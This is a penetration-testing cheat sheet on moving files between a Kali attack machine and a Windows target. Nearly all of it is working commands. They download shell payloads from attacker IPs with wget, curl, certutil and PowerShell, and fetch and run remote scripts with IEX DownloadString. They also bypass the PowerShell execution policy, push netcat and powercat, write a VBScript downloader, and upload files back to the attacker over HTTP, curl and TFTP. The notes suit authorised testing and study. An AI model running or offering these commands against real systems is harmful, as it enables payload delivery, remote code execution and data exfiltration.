# File Transfer

## wget, curl, axel, certutil

Server

=== "Apache2"

	``` bash
	sudo systemctl start apache2
	```

=== "Python"

	``` bash
	python3 -m http.server 80

	python -m SimpleHTTPServer 80
	```

=== "php"

	``` bash
	php -S 0.0.0.0:80
	```
=== "busybox"

	``` bash
	busybox httpd -f -p 80
	```

Client

=== "wget"

	``` bash
	wget -O /tmp/shell http://192.168.110.131/shell.elf
	
	wget <uri> -P /path/to/
	```

=== "curl"

	``` bash
	curl -o /tmp/shell http://192.168.110.131/shell.elf
	```

=== "axel"

	``` bash
	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
	```

=== "certutil"

	``` bash
	certutil.exe -urlcache -f http://<url>/shell.exe C:\\inetpub\\wwwroot\\shell.exe
	```

## Socat

Kali machine

``` bash
sudo socat TCP4-LISTEN:443,fork file:shell.exe
```

Windows machine

``` bash
socat TCP4:192.168.11.130:443 file:shell.exe,create
```

## Netcat

Kali machine

``` bash
nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
```

Windows machine

``` bash
nc -nv 192.168.11.130 4444 > wget.exe
```

## SMB Protocol

Install

``` bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
sudo pip install -r requirements.txt
sudo python3 setup.py install
```

SMB Server

``` bash
$ locate whoami.exe
/usr/share/windows-resources/binaries/whoami.exe

$ smbserver.py a /usr/share/windows-binaries/
```

SMB Client

``` bash
$ \\<ip_server>\a\whoami.exe
```

## PowerShell

Kali machine

``` bash
sudo python3 -m http.server 80
```

Windows machine

``` bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.11.130/wget.exe','C:\Users\Public\Desktop\wget.exe')"
```

Executing a remote PowerShell script

``` bash
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.11.140/helloworld.ps1')
```

## Powercat

=== "Bypass policy"

	``` powershell
	Set-ExecutionPolicy Unrestricted
	```

=== "Download and execute from internet"

	``` powershell
	iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
	```

=== "Local machine"

	``` powershell
	. .\powercat.ps1
	```

Kali machine

``` bash
sudo nc -lnvp 443 > powercat.ps1
```

Windows machine

``` bash
powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
```

## [VBScript](http://www.ericphelps.com/scripting/samples)

=== "command"

	Paste and execute `wget.vbs` script to the Windows machine.

	``` bash
	cscript wget.vbs http://<url>/shell.exe shell.exe
	```

=== "wget.vbs"

	``` bash
	echo strUrl = WScript.Arguments.Item(0) > wget.vbs
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
	echo Err.Clear >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
	echo http.Open "GET", strURL, False >> wget.vbs
	echo http.Send >> wget.vbs
	echo varByteArray = http.ResponseBody >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
	echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
	echo strData = "" >> wget.vbs
	echo strBuffer = "" >> wget.vbs
	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
	echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
	echo Next >> wget.vbs
	echo ts.Close >> wget.vbs
	```

## Hex String

Smaller file

``` bash
upx -9 nc.exe
```

``` bash
exe2hex -x nc.exe -p nc.cmd
```

## FTP Server

Install

``` bash
sudo apt-get install vsftpd
sudo service vsftpd start
```

Anonymous access

``` bash
sudo nano /etc/vsftpd.conf

=> anonymous_enable=YES
```

## Pure-FTPd

setup-ftp.sh

``` bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd hades -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```

ftp.txt

``` bash
open 192.168.11.140 21
USER hades
passwd
bin
GET nc.exe
quit
```

``` bash
ftp -v -n -s:ftp.txt
```

## Upload files

### HTTP Server

Kali Machine

``` php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile= $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Client

PowerShell

``` bash
powershell.exe (New-Object System.Net.WebClient).UploadFile('http://192.168.11.140/upload.php', 'test.txt')
```

curl

``` bash
curl -F "file=@nc.cmd" http://192.168.11.140/upload.php
```

### TFTP

``` bash
sudo atftpd --daemon --port 69 /tftp
```

``` bash
getent services tftp
```

``` bash
tftp -i 192.168.11.140 put test.txt
```